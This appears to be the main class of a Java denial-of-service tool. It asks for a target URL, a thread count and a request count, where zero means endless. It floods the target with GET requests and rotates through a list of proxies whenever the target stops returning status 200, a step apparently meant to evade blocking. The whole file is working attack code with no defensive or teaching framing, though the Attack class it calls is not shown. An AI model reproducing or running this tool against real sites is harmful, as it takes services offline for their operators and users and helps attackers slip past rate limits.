import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.net.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

public class Main {
    public static Scanner scanner = new Scanner(System.in);
    public static Attack attack = new Attack();

    private static List<String> proxies = new ArrayList<>();

    public static int currentProxyIndex = 0;

    public static Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress("62.99.67.216", 8080));

    public static void main(String[] args){
//        try {
//            URL obj = new URL("http://google.com");
//            HttpURLConnection con = (HttpURLConnection) obj.openConnection(proxy);
//            con.setRequestMethod("GET");
//            System.out.println( con.getResponseCode() );
//
//        } catch (MalformedURLException e) {
//            e.printStackTrace();
//        } catch (ProtocolException e) {
//            e.printStackTrace();
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
        
        System.out.print("URL - (http://domain): ");
        String url = scanner.next();

        System.out.print("Threads: ");
        int threads = scanner.nextInt();

        System.out.print("Number of requests (0 is infinity): ");
        int times = scanner.nextInt();

        System.out.print("Use Proxy Or Not?(y, n): ");
        boolean useProxy = scanner.next().equals("y");

        attack.setUrl(url);

        if(useProxy){
            try {
                readFileAndSetProxiesList(new File(".").getCanonicalPath());
            } catch (IOException e) {
                return;
            }

            System.out.print("Status Code Checking delay (miliseconds): ");
            int delay = scanner.nextInt();

            for (int i = 0; i < threads; i++) {
                attack.sendGetThread(times, url);
            }

            while(true){
                if(currentProxyIndex == proxies.size())
                    break;

                if(Attack.statusCode != 200){
                    try {
                        String ip = proxies.get(currentProxyIndex++);

                        attack.setProxy(ip.split(":")[0], Integer.parseInt(ip.split(":")[1]));
                        System.out.println("Status Code: " + Attack.statusCode);
                        System.out.println("Set Proxy - " + attack.proxy);

                        Thread.sleep(delay);

                    } catch (InterruptedException e) {

                    } catch (ArrayIndexOutOfBoundsException e){

                    }
                }
            }
        }
        else {
            for (int i = 0; i < threads; i++) {
                attack.sendGetThread(times, url);
            }
        }
    }

    private static void readFileAndSetProxiesList(String path) {
        try {
            Scanner in = new Scanner(new FileReader(path + "\\proxy.txt"));
            while(in.hasNext()) {
                proxies.add(in.next());
            }
            in.close();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}